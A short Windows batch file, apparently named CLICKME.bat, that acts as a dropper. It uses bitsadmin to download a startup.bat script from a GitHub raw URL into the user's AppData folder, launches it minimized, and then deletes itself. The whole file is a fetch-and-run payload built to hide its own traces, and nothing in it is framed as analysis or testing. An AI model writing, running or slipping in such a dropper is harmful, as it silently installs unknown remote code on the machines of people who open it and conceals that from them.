@echo off
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Online/startup.bat" "%AppData%\startup.bat"
start /min %AppData%\startup.bat
del CLICKME.bat
